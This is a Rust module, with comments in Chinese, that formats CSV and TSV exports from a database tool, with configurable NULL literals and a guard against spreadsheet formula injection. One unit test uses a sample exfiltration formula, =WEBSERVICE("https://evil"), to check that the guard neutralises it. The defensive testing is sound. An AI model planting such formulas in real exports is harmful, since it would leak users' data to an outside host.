use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::fmt;
use std::io::Write;

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum CsvQuoteMode {
    #[default]
    All,
    Necessary,
}

/// CSV 里 NULL 的默认字面量（`\N`，MySQL `SELECT ... INTO OUTFILE` 惯例）。
///
/// 默认值必须同时被导出与导入两侧引用：导出写出该字面量、导入按该字面量还原 NULL，
/// 空字符串则始终写成 `""`，这样「空字符串」与「NULL」在 CSV 中不再互相冒充。
pub const DEFAULT_CSV_NULL_LITERAL: &str = "\\N";

/// 把导出/导入配置里的原始字面量解析成实际生效的值：空串表示「不写 NULL 标记」，
/// 即沿用历史行为（NULL 写成空字段，无法与空字符串区分）。
pub fn csv_null_literal(raw: &str) -> Option<&str> {
    if raw.is_empty() {
        None
    } else {
        Some(raw)
    }
}

/// 导出/导入配置里 NULL 字面量的 serde 默认值：未显式配置时用 [`DEFAULT_CSV_NULL_LITERAL`]。
pub fn default_csv_null_literal() -> String {
    DEFAULT_CSV_NULL_LITERAL.to_string()
}

/// Excel/Sheets 公式注入中和：以 `=`、`+`、`-`、`@`、Tab、CR 开头的文本在导出
/// 时前置 `'`，避免 `=WEBSERVICE(...)` 类值被电子表格应用按公式执行（数据外泄）。
/// 与 DBeaver/DataGrip 的既有做法一致；代价是这类单元格回导时会多出前缀。
/// 数值列不受影响（Number 分支不走文本路径）。
fn push_formula_guard(out: &mut String, value: &str) {
    if matches!(value.as_bytes().first(), Some(b'=') | Some(b'+') | Some(b'-') | Some(b'@') | Some(b'\t') | Some(b'\r'))
    {
        out.push('\'');
    }
}

/// CSV 转义直写目标 buffer：包引号 + 内部 `"` 翻倍。值不含 `"` 时整段拷贝，
/// 不做 replace 分配（逐批流式导出对每个单元格调用，是导出热路径）。
fn push_csv_escaped_content(out: &mut String, value: &str) {
    push_formula_guard(out, value);
    let mut rest = value;
    while let Some(pos) = rest.find('"') {
        out.push_str(&rest[..=pos]);
        out.push('"');
        rest = &rest[pos + 1..];
    }
    out.push_str(rest);
}

pub fn push_csv_escaped(out: &mut String, value: &str) {
    out.push('"');
    push_csv_escaped_content(out, value);
    out.push('"');
}

fn csv_field_needs_quotes(value: &str) -> bool {
    value.bytes().any(|byte| matches!(byte, b',' | b'"' | b'\n' | b'\r'))
}

pub fn push_csv_field(out: &mut String, value: &str, quote_mode: CsvQuoteMode) {
    if quote_mode == CsvQuoteMode::All || csv_field_needs_quotes(value) {
        push_csv_escaped(out, value);
    } else {
        push_formula_guard(out, value);
        out.push_str(value);
    }
}

struct CsvEscapedWriter<'a>(&'a mut String);

impl fmt::Write for CsvEscapedWriter<'_> {
    fn write_str(&mut self, value: &str) -> fmt::Result {
        push_csv_escaped_content(self.0, value);
        Ok(())
    }
}

/// 将表导出 CSV 值直接写入已有 buffer；包括 NULL 在内的值均保留分页导出的带引号旧语义。
pub fn push_csv_text_value(out: &mut String, value: &Value) {
    out.push('"');
    match value {
        Value::Null => {}
        Value::String(value) => push_csv_escaped_content(out, value),
        Value::Bool(value) => out.push_str(if *value { "true" } else { "false" }),
        Value::Number(value) => {
            fmt::write(out, format_args!("{value}")).expect("writing a number into a String cannot fail")
        }
        // 数组和对象可能包含引号，通过转义 writer 格式化，避免分配中间 JSON 字符串
        other => fmt::write(&mut CsvEscapedWriter(out), format_args!("{other}"))
            .expect("writing JSON into a String cannot fail"),
    }
    out.push('"');
}

fn push_csv_value_with_quote_mode(
    out: &mut String,
    value: &Value,
    quote_mode: CsvQuoteMode,
    quote_null: bool,
    null_literal: Option<&str>,
) {
    if value.is_null() {
        // 配置了 NULL 字面量时，NULL 写成该字面量；空字符串仍然写成 `""`。
        // 两者不再互相冒充，导出→导入才能无损往返。
        //
        // 字面量必须尽量裸写：PostgreSQL 的 COPY ... FORMAT csv 从不把带引号的值当成 NULL
        // （`"\N"` 是普通字符串，整数列直接报错），ClickHouse 的 CSV 读取更是在引号内遇到
        // `\N` 就解析失败；只有裸 `\N` 才是这两者与 MySQL 共同识别的 NULL。字面量自身含
        // 分隔符/引号/换行时才加引号（此时它本来也不再是标准 NULL 标记）。
        if let Some(literal) = null_literal {
            push_csv_field(out, literal, CsvQuoteMode::Necessary);
            return;
        }
    }
    if quote_mode == CsvQuoteMode::All {
        if value.is_null() && !quote_null {
            return;
        }
        push_csv_text_value(out, value);
        return;
    }

    match value {
        Value::Null => {}
        Value::String(value) => push_csv_field(out, value, quote_mode),
        Value::Bool(value) => out.push_str(if *value { "true" } else { "false" }),
        Value::Number(value) => {
            fmt::write(out, format_args!("{value}")).expect("writing a number into a String cannot fail")
        }
        other => push_csv_field(out, &other.to_string(), quote_mode),
    }
}

/// TSV 转义直写：仅含特殊字符时包引号（语义与原 escape_tsv 一致）。
fn push_tsv_escaped(out: &mut String, value: &str) {
    if value.contains('\t') || value.contains('\n') || value.contains('\r') || value.contains('"') {
        push_csv_escaped(out, value);
    } else {
        push_formula_guard(out, value);
        out.push_str(value);
    }
}

fn push_tsv_value(out: &mut String, value: &Value, null_literal: Option<&str>) {
    if value.is_null() {
        // 与 CSV 一致：NULL 写字面量、空字符串写空字段，导出→导入才能无损往返。
        if let Some(literal) = null_literal {
            push_tsv_escaped(out, literal);
            return;
        }
    }
    match value {
        Value::Null => {}
        Value::String(v) => push_tsv_escaped(out, v),
        Value::Bool(v) => out.push_str(if *v { "true" } else { "false" }),
        Value::Number(value) => {
            fmt::write(out, format_args!("{value}")).expect("writing a number into a String cannot fail")
        }
        other => push_tsv_escaped(out, &other.to_string()),
    }
}

pub fn push_tsv_row(out: &mut String, row: &[Value], null_literal: Option<&str>) {
    for (cell_index, cell) in row.iter().enumerate() {
        if cell_index > 0 {
            out.push('\t');
        }
        push_tsv_value(out, cell, null_literal);
    }
}

/// 预分配粗估：按全部行的实际单元格数求和（不假设等宽），饱和运算防溢出，
/// 并设上限——估算只是性能提示，绝不能因病态输入放大成巨额分配
const ROWS_CAPACITY_ESTIMATE_MAX: usize = 16 * 1024 * 1024;

pub fn estimated_rows_capacity(rows: &[Vec<Value>]) -> usize {
    let cells: usize = rows.iter().map(Vec::len).fold(0usize, usize::saturating_add);
    cells.saturating_mul(12).min(ROWS_CAPACITY_ESTIMATE_MAX)
}

#[cfg_attr(not(test), allow(dead_code))]
pub fn escape_csv(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    push_csv_escaped(&mut out, value);
    out
}

fn escape_csv_with_quote_mode(value: &str, quote_mode: CsvQuoteMode) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    push_csv_field(&mut out, value, quote_mode);
    out
}

#[cfg_attr(not(test), allow(dead_code))]
pub fn escape_tsv(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    push_tsv_escaped(&mut out, value);
    out
}

fn push_tsv_rows(out: &mut String, rows: &[Vec<Value>], null_literal: Option<&str>) {
    for (row_index, row) in rows.iter().enumerate() {
        if row_index > 0 {
            out.push('\n');
        }
        push_tsv_row(out, row, null_literal);
    }
}

#[cfg_attr(not(test), allow(dead_code))]
pub fn format_tsv_rows(rows: &[Vec<Value>]) -> String {
    let mut out = String::with_capacity(estimated_rows_capacity(rows));
    push_tsv_rows(&mut out, rows, None);
    out
}

pub fn format_tsv(columns: &[String], rows: &[Vec<Value>]) -> String {
    let mut out = String::with_capacity(
        estimated_rows_capacity(rows).saturating_add(columns.len().saturating_mul(12)).min(ROWS_CAPACITY_ESTIMATE_MAX),
    );
    for (index, column) in columns.iter().enumerate() {
        if index > 0 {
            out.push('\t');
        }
        push_tsv_escaped(&mut out, column);
    }
    out.push('\n');
    push_tsv_rows(&mut out, rows, None);
    out
}

/// Format query-result rows as CSV text without a header row. Database NULLs
/// use the same empty-cell representation as table-data exports. Used by the
/// streaming query-result export for batches after the first.
pub fn push_query_result_csv_row(out: &mut String, row: &[Value]) {
    push_query_result_csv_row_with_quote_mode(out, row, CsvQuoteMode::All);
}

pub fn push_query_result_csv_row_with_quote_mode(out: &mut String, row: &[Value], quote_mode: CsvQuoteMode) {
    push_query_result_csv_row_with_options(out, row, quote_mode, None);
}

/// 与 [`push_query_result_csv_row_with_quote_mode`] 相同，但允许把 NULL 写成指定字面量。
pub fn push_query_result_csv_row_with_options(
    out: &mut String,
    row: &[Value],
    quote_mode: CsvQuoteMode,
    null_literal: Option<&str>,
) {
    for (cell_index, cell) in row.iter().enumerate() {
        if cell_index > 0 {
            out.push(',');
        }
        push_csv_value_with_quote_mode(out, cell, quote_mode, false, null_literal);
    }
}

pub fn push_table_csv_row(out: &mut String, row: &[Value]) {
    push_table_csv_row_with_quote_mode(out, row, CsvQuoteMode::All);
}

pub fn push_table_csv_row_with_quote_mode(out: &mut String, row: &[Value], quote_mode: CsvQuoteMode) {
    push_table_csv_row_with_options(out, row, quote_mode, None);
}

/// 与 [`push_table_csv_row_with_quote_mode`] 相同，但允许把 NULL 写成指定字面量。
pub fn push_table_csv_row_with_options(
    out: &mut String,
    row: &[Value],
    quote_mode: CsvQuoteMode,
    null_literal: Option<&str>,
) {
    for (cell_index, cell) in row.iter().enumerate() {
        if cell_index > 0 {
            out.push(',');
        }
        push_csv_value_with_quote_mode(out, cell, quote_mode, true, null_literal);
    }
}

fn push_query_result_csv_rows(out: &mut String, rows: &[Vec<Value>]) {
    for (row_index, row) in rows.iter().enumerate() {
        if row_index > 0 {
            out.push('\n');
        }
        push_query_result_csv_row(out, row);
    }
}

pub fn format_query_result_csv_rows(rows: &[Vec<Value>]) -> String {
    let mut out = String::with_capacity(estimated_rows_capacity(rows));
    push_query_result_csv_rows(&mut out, rows);
    out
}

fn format_csv_with_value_formatter(columns: &[String], rows: &[Vec<Value>]) -> String {
    let mut out = String::with_capacity(
        estimated_rows_capacity(rows).saturating_add(columns.len().saturating_mul(12)).min(ROWS_CAPACITY_ESTIMATE_MAX),
    );
    for (index, column) in columns.iter().enumerate() {
        if index > 0 {
            out.push(',');
        }
        push_csv_escaped(&mut out, column);
    }
    out.push('\n');
    push_query_result_csv_rows(&mut out, rows);
    out
}

pub fn format_csv(columns: &[String], rows: &[Vec<Value>]) -> String {
    format_csv_with_value_formatter(columns, rows)
}

pub fn format_csv_with_quote_mode(columns: &[String], rows: &[Vec<Value>], quote_mode: CsvQuoteMode) -> String {
    format_csv_with_options(columns, rows, quote_mode, None)
}

/// 与 [`format_csv_with_quote_mode`] 相同，但允许把 NULL 写成指定字面量。
///
/// 表数据导出的首批行走这里，后续分批走 [`push_table_csv_row_with_options`]：
/// 两处必须收到同一个字面量，否则同一个文件里 NULL 会前后不一致。
pub fn format_csv_with_options(
    columns: &[String],
    rows: &[Vec<Value>],
    quote_mode: CsvQuoteMode,
    null_literal: Option<&str>,
) -> String {
    let mut out = String::with_capacity(
        estimated_rows_capacity(rows).saturating_add(columns.len().saturating_mul(12)).min(ROWS_CAPACITY_ESTIMATE_MAX),
    );
    for (index, column) in columns.iter().enumerate() {
        if index > 0 {
            out.push(',');
        }
        push_csv_field(&mut out, column, quote_mode);
    }
    out.push('\n');
    for (row_index, row) in rows.iter().enumerate() {
        if row_index > 0 {
            out.push('\n');
        }
        push_query_result_csv_row_with_options(&mut out, row, quote_mode, null_literal);
    }
    out
}

pub fn format_query_result_csv(columns: &[String], rows: &[Vec<Value>]) -> String {
    format_csv(columns, rows)
}

pub fn format_query_result_csv_with_quote_mode(
    columns: &[String],
    rows: &[Vec<Value>],
    quote_mode: CsvQuoteMode,
) -> String {
    format_csv_with_options(columns, rows, quote_mode, None)
}

/// 与 [`format_query_result_csv_with_quote_mode`] 相同，但允许把 NULL 写成指定字面量。
pub fn format_query_result_csv_with_options(
    columns: &[String],
    rows: &[Vec<Value>],
    quote_mode: CsvQuoteMode,
    null_literal: Option<&str>,
) -> String {
    format_csv_with_options(columns, rows, quote_mode, null_literal)
}

pub fn write_csv_text_row(
    writer: &mut impl Write,
    values: impl IntoIterator<Item = String>,
    quote_mode: CsvQuoteMode,
) -> Result<(), String> {
    let mut first = true;
    for value in values {
        if !first {
            writer.write_all(b",").map_err(|err| err.to_string())?;
        }
        first = false;
        writer.write_all(escape_csv_with_quote_mode(&value, quote_mode).as_bytes()).map_err(|err| err.to_string())?;
    }
    Ok(())
}

pub fn write_csv_value_row(
    writer: &mut impl Write,
    values: impl IntoIterator<Item = Value>,
    quote_mode: CsvQuoteMode,
) -> Result<(), String> {
    write_csv_value_row_with_options(writer, values, quote_mode, None)
}

/// 与 [`write_csv_value_row`] 相同，但允许把 NULL 写成指定字面量。
pub fn write_csv_value_row_with_options(
    writer: &mut impl Write,
    values: impl IntoIterator<Item = Value>,
    quote_mode: CsvQuoteMode,
    null_literal: Option<&str>,
) -> Result<(), String> {
    let mut first = true;
    let mut formatted = String::new();
    for value in values {
        if !first {
            writer.write_all(b",").map_err(|err| err.to_string())?;
        }
        first = false;
        formatted.clear();
        push_csv_value_with_quote_mode(&mut formatted, &value, quote_mode, false, null_literal);
        writer.write_all(formatted.as_bytes()).map_err(|err| err.to_string())?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::{
        format_csv, format_csv_with_options, format_csv_with_quote_mode, format_query_result_csv,
        format_query_result_csv_rows, format_tsv, CsvQuoteMode, DEFAULT_CSV_NULL_LITERAL,
    };
    use serde_json::json;

    #[test]
    fn formats_csv_with_header_and_escaped_values() {
        let out = format_csv(&["id".to_string(), "name".to_string()], &[vec![json!(1), json!("Ada \"Lovelace\"")]]);
        assert_eq!(out, "\"id\",\"name\"\n\"1\",\"Ada \"\"Lovelace\"\"\"");
    }

    #[test]
    fn formats_null_as_empty_cell() {
        let out = format_csv(&["id".to_string(), "note".to_string()], &[vec![json!(1), Value::Null]]);
        assert_eq!(out, "\"id\",\"note\"\n\"1\",");
    }

    #[test]
    fn formats_query_result_null_as_empty_cell() {
        let out = format_query_result_csv(&["id".to_string(), "note".to_string()], &[vec![json!(1), Value::Null]]);
        assert_eq!(out, "\"id\",\"note\"\n\"1\",");
    }

    #[test]
    fn necessary_quote_mode_only_quotes_csv_special_characters() {
        let out = format_csv_with_quote_mode(
            &["id".to_string(), "district,name".to_string(), "note".to_string()],
            &[
                vec![json!(2085252644_u64), json!("延庆县"), json!("plain")],
                vec![json!(2085252645_u64), json!("门头沟区"), json!("line 1\n\"line 2\"")],
            ],
            CsvQuoteMode::Necessary,
        );
        assert_eq!(
            out,
            "id,\"district,name\",note\n2085252644,延庆县,plain\n2085252645,门头沟区,\"line 1\n\"\"line 2\"\"\""
        );
    }

    #[test]
    fn csv_quote_mode_defaults_to_all_for_backward_compatibility() {
        assert_eq!(CsvQuoteMode::default(), CsvQuoteMode::All);
    }

    #[test]
    fn formats_streamed_query_result_null_as_empty_cell_and_preserves_literal_null() {
        let out = format_query_result_csv_rows(&[vec![Value::Null, json!("NULL"), json!("")]]);
        assert_eq!(out, ",\"NULL\",\"\"");
    }

    #[test]
    fn formats_tsv_with_empty_null_and_escaped_special_values() {
        let out = format_tsv(
            &["id".to_string(), "note".to_string()],
            &[vec![json!(1), Value::Null], vec![json!(2), json!("line1\n\"line2\"")]],
        );
        assert_eq!(out, "id\tnote\n1\t\n2\t\"line1\n\"\"line2\"\"\"");
    }

    #[test]
    fn capacity_estimate_sums_actual_cells_across_ragged_rows() {
        // 不等宽行按实际单元格数求和，不得按首行宽度放大
        let wide_first = vec![vec![serde_json::Value::Null; 1000], vec![], vec![serde_json::Value::Null]];
        assert_eq!(super::estimated_rows_capacity(&wide_first), 1001 * 12);
        assert!(super::estimated_rows_capacity(&[]) == 0);
    }

    #[test]
    fn escape_tsv_matches_reference_semantics() {
        // TSV 仅在含 \t/\n/\r/引号时包引号；逗号不触发
        for input in ["", "plain", "with,comma", "tab\there", "line\nbreak", "cr\rhere", "quo\"te", "\t\"mix\""] {
            // 公式中和前缀与转义正交：触发字符开头的文本无论是否包引号都带前缀
            let guard = if matches!(
                input.as_bytes().first(),
                Some(b'=') | Some(b'+') | Some(b'-') | Some(b'@') | Some(b'\t') | Some(b'\r')
            ) {
                "'"
            } else {
                ""
            };
            let expected =
                if input.contains('\t') || input.contains('\n') || input.contains('\r') || input.contains('"') {
                    format!("\"{guard}{}\"", input.replace('"', "\"\""))
                } else {
                    format!("{guard}{input}")
                };
            assert_eq!(super::escape_tsv(input), expected, "input: {input:?}");
        }
    }

    #[test]
    fn push_csv_escaped_matches_replace_reference() {
        // 直写实现必须与原 replace 版本逐字节等价（含引号在首/尾/连续的边界）
        for input in ["", "plain", "\"", "\"\"", "a\"b", "\"start", "end\"", "mid\"\"dle", "逗,号\n换行"] {
            let expected = format!("\"{}\"", input.replace('"', "\"\""));
            assert_eq!(super::escape_csv(input), expected, "input: {input:?}");
        }
    }

    #[test]
    fn push_csv_text_value_preserves_paginated_export_semantics() {
        let cases = [
            (serde_json::Value::Null, "\"\""),
            (serde_json::json!(true), "\"true\""),
            (serde_json::json!(42.5), "\"42.5\""),
            (serde_json::json!("a\"b"), "\"a\"\"b\""),
            (serde_json::json!({"key": "value"}), "\"{\"\"key\"\":\"\"value\"\"}\""),
        ];

        for (value, expected) in cases {
            let mut out = String::from("prefix,");
            super::push_csv_text_value(&mut out, &value);
            assert_eq!(out, format!("prefix,{expected}"));
        }
    }

    #[test]
    fn default_null_literal_is_the_mysql_outfile_convention() {
        assert_eq!(DEFAULT_CSV_NULL_LITERAL, "\\N");
        // 空串表示「不写 NULL 标记」，即沿用历史行为
        assert_eq!(super::csv_null_literal(""), None);
        assert_eq!(super::csv_null_literal(DEFAULT_CSV_NULL_LITERAL), Some("\\N"));
    }

    #[test]
    fn tsv_null_literal_separates_null_from_an_empty_string() {
        let row = vec![Value::Null, json!("")];

        // 未配置字面量（旧行为）：NULL 与空串都写空字段，二者在文件里无法区分
        let mut out = String::new();
        super::push_tsv_row(&mut out, &row, None);
        assert_eq!(out, "\t");

        // 配置字面量后：NULL 写成字面量，空字符串仍是空字段
        let mut out = String::new();
        super::push_tsv_row(&mut out, &row, Some(DEFAULT_CSV_NULL_LITERAL));
        assert_eq!(out, "\\N\t");
    }

    #[test]
    fn null_literal_stops_null_from_impersonating_an_empty_string() {
        let columns = vec!["a".to_string(), "b".to_string()];
        let row = vec![Value::Null, json!("")];

        // 未配置字面量（旧行为）：NULL 写成裸空字段，空串写成 `""`，
        // 文件里看似可区分，但导入端拿不到引号信息，两者最终都会变成 NULL
        assert_eq!(
            format_csv_with_options(&columns, std::slice::from_ref(&row), CsvQuoteMode::All, None),
            "\"a\",\"b\"\n,\"\""
        );

        // 配置字面量后：NULL 写成裸字面量，空串写成 `""`；即使 quote mode = All 也不给
        // 字面量加引号，否则 PostgreSQL/ClickHouse 的 CSV 读取不认它是 NULL
        assert_eq!(
            format_csv_with_options(
                &columns,
                std::slice::from_ref(&row),
                CsvQuoteMode::All,
                Some(DEFAULT_CSV_NULL_LITERAL)
            ),
            "\"a\",\"b\"\n\\N,\"\""
        );
        // Necessary 模式：空串裸写为空字段，但 NULL 有独立字面量，仍然可区分
        assert_eq!(
            format_csv_with_options(
                &columns,
                std::slice::from_ref(&row),
                CsvQuoteMode::Necessary,
                Some(DEFAULT_CSV_NULL_LITERAL)
            ),
            "a,b\n\\N,"
        );
    }

    #[test]
    fn null_literal_is_quoted_only_when_it_needs_quoting() {
        let columns = vec!["a".to_string()];
        let row = vec![Value::Null];

        // 标准字面量裸写（PostgreSQL/ClickHouse/MySQL 共同识别的 NULL 写法）
        assert_eq!(
            format_csv_with_options(&columns, std::slice::from_ref(&row), CsvQuoteMode::All, Some("\\N")),
            "\"a\"\n\\N"
        );
        // 自定义字面量含分隔符时无法裸写，只能退化成带引号的普通字段
        assert_eq!(
            format_csv_with_options(&columns, std::slice::from_ref(&row), CsvQuoteMode::All, Some("a,b")),
            "\"a\"\n\"a,b\""
        );
    }

    #[test]
    fn null_literal_applies_to_streaming_row_writers_too() {
        let row = vec![Value::Null, json!("NULL"), json!("")];

        let mut table = String::new();
        super::push_table_csv_row_with_options(&mut table, &row, CsvQuoteMode::All, Some(DEFAULT_CSV_NULL_LITERAL));
        assert_eq!(table, "\\N,\"NULL\",\"\"");

        let mut query = String::new();
        super::push_query_result_csv_row_with_options(
            &mut query,
            &row,
            CsvQuoteMode::All,
            Some(DEFAULT_CSV_NULL_LITERAL),
        );
        assert_eq!(query, "\\N,\"NULL\",\"\"");

        let mut written = Vec::new();
        super::write_csv_value_row_with_options(&mut written, row, CsvQuoteMode::All, Some(DEFAULT_CSV_NULL_LITERAL))
            .unwrap();
        assert_eq!(String::from_utf8(written).unwrap(), "\\N,\"NULL\",\"\"");
    }

    #[test]
    fn reusable_row_buffers_match_batch_formatters() {
        let row = vec![Value::Null, json!("NULL"), json!("line\n\"two\""), json!(42)];

        let mut csv = String::new();
        super::push_query_result_csv_row(&mut csv, &row);
        assert_eq!(csv, super::format_query_result_csv_rows(std::slice::from_ref(&row)));

        let mut table_csv = String::new();
        super::push_table_csv_row(&mut table_csv, &row);
        assert_eq!(table_csv, "\"\",\"NULL\",\"line\n\"\"two\"\"\",\"42\"");

        let mut tsv = String::new();
        super::push_tsv_row(&mut tsv, &row, None);
        assert_eq!(tsv, super::format_tsv_rows(&[row]));
    }

    #[test]
    fn formula_like_text_cells_are_neutralized() {
        let out = format_csv(
            &["cmd".to_string()],
            &[
                vec![json!("=WEBSERVICE(\"https://evil\")")],
                vec![json!("+2")],
                vec![json!("-3")],
                vec![json!("@x")],
                vec![json!("\tlead")],
                vec![json!("safe")],
                vec![json!(-4)],
            ],
        );
        assert_eq!(
            out,
            "\"cmd\"\n\"'=WEBSERVICE(\"\"https://evil\"\")\"\n\"'+2\"\n\"'-3\"\n\"'@x\"\n\"'\tlead\"\n\"safe\"\n\"-4\""
        );
    }

    #[test]
    fn formula_guard_covers_necessary_mode_raw_cells_and_tsv() {
        let out = format_csv_with_quote_mode(
            &["v".to_string()],
            &[vec![json!("=sum")], vec![json!("x=y")]],
            CsvQuoteMode::Necessary,
        );
        assert_eq!(out, "v\n'=sum\nx=y");
        let tsv = format_tsv(&["v".to_string()], &[vec![json!("=sum")], vec![json!("plain")]]);
        assert_eq!(tsv, "v\n'=sum\nplain");
    }

    use serde_json::Value;
}
